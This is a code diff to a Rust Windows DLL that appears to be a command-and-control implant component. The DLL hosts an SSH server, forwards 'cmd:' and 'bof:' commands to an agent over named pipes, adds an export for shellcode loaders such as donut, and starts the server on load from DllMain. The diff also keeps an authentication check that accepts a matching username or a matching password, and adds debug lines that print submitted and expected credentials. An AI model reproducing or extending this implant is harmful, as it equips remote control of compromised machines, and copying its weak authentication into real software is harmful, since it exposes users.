@@ -29,21 +29,19 @@ fn initialize_handles() -> (Option<HANDLE>, Option<HANDLE>){
     (pipe::initialize_input_pipe(), pipe::initialize_output_pipe())
 }
 
+// Call this from loaders like donut, otherwise ignore this
+#[unsafe(no_mangle)]
+pub unsafe extern "system" fn dll_start(){
+    // Initialize resources, etc.
+    let rt = tokio::runtime::Runtime::new().unwrap();
+
+    // Block on the async function
+    rt.block_on(dll_main());
+}
+
 pub async fn dll_main() {
-
-    let pipes = initialize_handles();
-
-    // Check if either pipe is None, and return early if so
-    if pipes.0.is_none() || pipes.1.is_none() {
-        debug_println!("Failed to initialize one or both pipes");
-        return;
-    }
-
-    unsafe {
-        G_H_INPUT_PIPE = pipes.0.unwrap();
-        G_H_OUTPUT_PIPE = pipes.1.unwrap();
-    }
-
+    debug_println!("Initialized handles");
+    debug_println!("Starting server");
     let config = russh::server::Config {
         inactivity_timeout: Some(std::time::Duration::from_secs(3600)),
         auth_rejection_time: std::time::Duration::from_secs(10),
@@ -70,8 +68,26 @@ pub async fn dll_main() {
     // Clone sh if needed (if it's a type that implements Clone)
     let mut sh_clone = sh.clone();
 
+    debug_println!("Starting command loop");
+
     // Create a new thread with its own tokio runtime
     thread::spawn(move || {
+
+        debug_println!("Initializing handles");
+
+        let pipes = initialize_handles();
+
+        // Check if either pipe is None, and return early if so
+        if pipes.0.is_none() || pipes.1.is_none() {
+            debug_println!("Failed to initialize one or both pipes");
+            std::process::exit(1);
+        }
+
+        unsafe {
+            G_H_INPUT_PIPE = pipes.0.unwrap();
+            G_H_OUTPUT_PIPE = pipes.1.unwrap();
+        }
+
         // Create a new tokio runtime for this thread
         let rt = Runtime::new().unwrap();
 
@@ -89,11 +105,13 @@ pub async fn dll_main() {
         .trim_matches(char::from(0))
         .parse::<u16>()
         .unwrap();
-
+    debug_println!("Starting server on {}:{}", interface_ip, interface_port);
     sh_clone
         .run_on_address(config, (interface_ip, interface_port))
         .await
         .unwrap();
+
+    debug_println!("Exiting server")
 }
 
 #[derive(Clone)]
@@ -133,7 +151,8 @@ impl Server {
             if input.eq("exit") {
                 std::process::exit(0);
             }
-            if input.starts_with("exec:") || input.starts_with("bof:") {
+            if input.starts_with("cmd:") || input.starts_with("bof:") {
+                debug_println!("Sending command to agent: {}", input);
                 self.post(CryptoVec::from(input)).await;
             }
         }
@@ -154,7 +173,7 @@ impl Server {
             if input.eq("exit") {
                 std::process::exit(0);
             }
-            if input.starts_with("exec:") || input.starts_with("bof:") {
+            if input.starts_with("cmd:") || input.starts_with("bof:") {
                 self.post(CryptoVec::from(input)).await;
             }
         }
@@ -196,11 +215,13 @@ impl server::Handler for Server {
             .to_string()
             .trim_matches(char::from(0))
             .to_string();
+
         let input_password = String::from_utf8_lossy(pass.as_bytes())
             .to_string()
             .trim_matches(char::from(0))
             .to_string();
-
+        debug_println!("Authenticating {}:{}", input_username, input_password);
+        debug_println!("Expected {}:{}", username, password);
         if input_username.eq(&username) || input_password.eq(&password) {
             return Ok(server::Auth::Accept);
         }
@@ -276,8 +297,12 @@ pub unsafe extern "system" fn DllMain(
     match call_reason {
         DLL_PROCESS_ATTACH => {
             // Code to run when the DLL is loaded into a process
+
             // Initialize resources, etc.
-            dll_main();
+            let rt = tokio::runtime::Runtime::new().unwrap();
+
+            // Block on the async function
+            rt.block_on(dll_main());
         }
         DLL_THREAD_ATTACH => {
             // Code to run when a new thread is created in the process
